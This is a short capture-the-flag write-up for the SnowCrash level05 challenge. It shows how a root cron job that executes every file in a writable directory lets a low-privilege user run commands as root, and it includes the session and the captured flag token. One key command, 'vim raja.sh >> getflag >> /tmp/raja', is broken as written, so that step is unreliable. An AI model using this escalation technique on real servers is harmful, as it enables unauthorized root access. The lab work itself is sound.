# LEVEL 05

when we log int to the level05 a message appear for informing us that there is a message
# in linux server

there is a folder /var/spool/mail where services and daemons that are configured by default to send notifications to root account mailbox

## Vulnerability & exploit
we know that Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server.
and the most of time commonly used for sysadmin jobs as backups or cleaning /tmp 

When a script executed by Cron is editable by unprivileged users, those unprivileged users can escalate their privilege by editing this script, and waiting for it to be executed by Cron under root privileges.


## Solving the challenge

User flag05 seems to inform us that he set up a cron job to run every 30 seconds
during the following script is run as root:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
when we see the script we can understand that the user will loop through all the files in /opt/openarenaserver and run them in a bash shell 

so it's appear that we can create a file in this directory and run it as a root using the crontab and since the script in that directory does not return or print the output of the command we will redirect the output to another file 

		level05@SnowCrash:/opt/openarenaserver$ touch raja.sh
		level05@SnowCrash:/opt/openarenaserver$ chmod 777 raja.sh 
		level05@SnowCrash:/opt/openarenaserver$ vim raja.sh >> getflag >> /tmp/raja
		level05@SnowCrash:/opt/openarenaserver$ cat /tmp/raja
		Check flag.Here is your token : viuaaale9huek52boumoomioc



